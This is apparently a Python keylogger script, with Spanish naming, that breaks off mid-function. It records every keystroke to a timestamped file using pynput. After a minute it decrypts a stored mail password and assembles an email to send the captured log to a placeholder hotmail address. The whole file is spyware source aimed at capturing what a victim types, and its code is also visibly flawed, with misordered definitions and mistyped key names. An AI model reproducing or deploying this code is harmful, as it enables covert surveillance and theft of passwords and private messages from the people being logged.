import datetime
import getpass

from pynput.keyboard import Listener

import time
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib
import getpass
import os

fecha = datetime.datetime.now().strftime('%d-%m-%Y %H-%M-%S')

tiempoInicial = time.time()

def grabarDatos(key):
    archivoConLosDatos = open('keylogger_{}.txt'.format(fecha), 'w')
    key = str(key)

    if key == 'key.enter':
        archivoConLosDatos.write('/n')
    elif key == 'Key.space':
        archivoConLosDatos.write(' ')
    elif key == 'Key.backspace':
        archivoConLosDatos.write('%BORRAR%')
    elif key == '<65027>':
        archivoConLosDatos.write('%ARROBA%')
    else:
        archivoConLosDatos.write(key.replace( "'", ""))

    if time.time() -tiempoInicial > 60:
        archivoConLosDatos.close()
        enviarMail(archivoConLosDatos)
        quit()

with Listener(on_press = grabarDatos) as l:
    l.join()

def enviarMail(archivoConLosDatos):
    def cargar_clave():
        return  open('clave.encriptacion', 'rb').read()

    key = cargar_clave()
    clave = Fernet(key)
    clave_encriptada = (open('clave.encriptada', 'rb').read())
    password = clave.decrypt((clave_encriptada)).decode()

    msg = MIMEMultipart()
    mensaje = 'Se envia el archivo solicitado'

    msg.attach(MIMEText(mensaje, 'plain'))

    msg['From'] = 'ejemplo@hotmail.com'
    msg['To'] = 'ejemplo@hotmail.com'
    msg['Subject'] = 'Archivo con los Datos'
